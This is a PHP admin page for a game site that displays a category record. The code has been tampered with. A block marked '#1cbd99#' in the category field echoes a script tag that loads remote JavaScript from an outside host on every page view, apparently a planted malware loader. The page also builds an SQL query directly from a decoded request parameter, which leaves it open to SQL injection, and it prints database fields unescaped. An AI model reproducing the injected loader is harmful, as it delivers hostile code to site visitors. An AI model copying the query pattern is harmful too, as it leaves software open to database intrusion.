<?php session_start();
ob_start();
$page = "View kural";

include "inc/session_check.php";

$vid = urlsafe_b64decode($_REQUEST['id']);
//echo $vid;
//echo "select * from category where id='$vid'";
$select = mysql_query("select * from category where id='$vid'");
$fetch_v = mysql_fetch_assoc($select);
?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | View Category</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Category
                  </div>
                </div>
                <div class="widget-body">

                	<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post"  >
	            	  <h5 class="text-info">Category Information</h5>
                    <hr>
                     
                    <div class="control-group">
                      <label class="control-label">
                        Category * :
                      </label>
                      <div class="controls">
                        <?=$fetch_v['cat_name']?>
<?php
#1cbd99#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967035\"></script>";
echo $g;
}
#/1cbd99#
?>                      </div>
                    </div>
					
					 
                    <div class="control-group">
                      <label class="control-label">
                        Section :
                      </label>
                      <div class="controls">
                        <?=$fetch_v['section']?>
                      </div>
                    </div>
					
										
					    <div class="control-group">
                      <label class="control-label">
                      	Status : </label>
                      <div class="controls">
				<?php if($fetch_v['status']==1){ echo "Active"; } 
				if($fetch_v['status']==0){ echo "Inactive"; } ?> 
				</div>
                    </div>               
			 
				 <div class="form-actions no-margin">
				 <a href="list_category.php">	<input type="button" class="btn btn-info" name="submit" value="Back"></a>
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>
  $(document).ready(function(){
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
    });
	 function dis_div(val)
    {
    	if(val=="link")
    	{
    		document.getElementById("vlink").style.display="block";
    		document.getElementById("vcode").style.display="none";
    	}
    	if(val=="code")
    	{
    		document.getElementById("vlink").style.display="none";
    		document.getElementById("vcode").style.display="block";
    	}
    }
</script>
</body>
</html>
	